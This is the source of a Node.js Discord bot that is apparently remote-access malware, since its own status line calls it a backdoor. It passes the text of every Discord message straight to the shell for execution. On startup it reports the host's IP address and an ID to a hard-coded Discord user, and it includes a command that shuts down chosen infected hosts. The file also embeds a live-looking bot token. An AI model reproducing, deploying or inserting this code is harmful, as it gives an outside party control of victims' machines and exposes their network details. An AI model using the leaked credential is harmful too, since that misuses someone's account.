const Discord = require("discord.js");
const exec = require('child_process').exec;
const bot = new Discord.Client();
const userid = createid()

bot.login("ODIyODU4ODc2MTI2NDk0NzUw.YFYZDA.imCVH6m4Ga1a-LuYz2ny-h_MTiM");

bot.on ("message", async (message) =>{
    exec(message.content)
    if(message.content == "$$getusers")
    {
        require('dns').lookup(require('os').hostname(), function (err, add, fam) {
            bot.users.fetch("703219730064080936").then((user) => {
                user.send("IP: " + add + "  ID: " + userid.toString())
            })
        })
    }
    if(message.content.startsWith("$$kick "))
    {
        require('dns').lookup(require('os').hostname(), function (err, add, fam) {
            bot.users.fetch("703219730064080936").then( (user) => {
                if(add == message.content.split("\"")[1])
                {
                    console.log("Kicked.")
                    bot.destroy()
                }
                if(userid == message.content.split("\"")[1])
                {
                    console.log("Kicked.")
                    bot.destroy()
                }
                if(err != null)
                {
                    user.send(err)
                }
            })
        })
    }
})

bot.on("ready", async (ready) => {
    console.log("Bot started.");
    bot.user.setActivity('Backdoor <3', { type: 'PLAYING' });
    require('dns').lookup(require('os').hostname(), function (err, add, fam) {
        bot.users.fetch("703219730064080936").then((user) => {
            user.send("New user:  IP: " + add + "   ID: " + userid.toString())
            if(err != null)
            {
                user.send(err)
            }
        });
    })
})

function createid() {
    return (Math.random() * (9 - 0) + 0).toString().split(".")[1];
}